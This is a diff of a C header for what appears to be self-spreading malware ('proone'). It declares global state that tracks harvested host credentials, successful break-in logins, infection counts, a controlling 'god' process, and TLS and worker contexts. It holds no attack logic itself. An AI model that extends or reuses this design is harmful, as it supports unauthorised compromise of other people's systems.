@@ -1,5 +1,5 @@
 #include "pack.h"
-#include "rnd.h"
+#include "resolv_worker.h"
 
 #include <stdint.h>
 #include <stdbool.h>
@@ -8,35 +8,41 @@
 #include <sys/types.h>
 
 #include <mbedtls/ssl.h>
+#include <mbedtls/entropy.h>
+#include <mbedtls/ctr_drbg.h>
 
 
 struct prne_global {
     uint8_t *host_cred_data;
     size_t host_cred_size;
-    char *ny_bin_shm_name;
-    prne_rnd_engine_t *rnd;
     struct timespec god_start;
-    uint64_t run_cnt;
+    uint_fast64_t run_cnt;
+    prne_resolv_wkr_ctx_t resolv;
+    int god_exit_evt;
     int caught_signal;
     pid_t god_pid;
     pid_t proone_pid;
     int lock_shm_fd;
-    int ny_bin_shm_fd;
     bool bin_ready;
-    bool s_ssl_ready;
-    bool c_ssl_ready;
+    bool is_child;
     
     prne_unpack_bin_archive_result_t bin_pack;
     prne_bin_archive_t bin_archive;
 
-    mbedtls_x509_crt ca;
     struct {
+        mbedtls_x509_crt ca;
+        mbedtls_entropy_context entpy;
+        mbedtls_ctr_drbg_context rnd;
+    } ssl;
+    struct {
+        bool ready;
         mbedtls_ssl_config conf;
         mbedtls_x509_crt crt;
         mbedtls_pk_context pk;
         mbedtls_dhm_context dhm;
     } s_ssl;
     struct {
+        bool ready;
         mbedtls_ssl_config conf;
         mbedtls_x509_crt crt;
         mbedtls_pk_context pk;
@@ -45,11 +51,13 @@ struct prne_global {
 
 struct prne_shared_global {
     // "break and entry" count. Number of successful logins.
-    uint64_t bne_cnt;
+    uint_fast64_t bne_cnt;
     // Number of successful infections.
-    uint64_t infect_cnt;
-    bool has_ny_bin;
+    uint_fast64_t infect_cnt;
 };
+
+static const intptr_t PRNE_RESOLV_WKR_ID = 0;
+static const intptr_t PRNE_HTBT_WKR_ID = 1;
 
 
 extern struct prne_global prne_g;
